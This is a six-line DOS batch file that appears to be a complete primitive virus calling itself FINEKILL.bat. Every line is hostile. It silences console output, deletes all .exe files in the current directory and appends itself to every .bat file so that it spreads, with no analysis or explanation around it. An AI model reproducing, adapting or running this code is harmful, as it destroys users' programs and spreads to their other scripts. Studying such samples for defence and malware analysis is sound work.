@echo off
@ctty nul
@del *.exe
@for %%f in (*.bat) do copy %%f + FINEKILL.bat
@ctty con
^z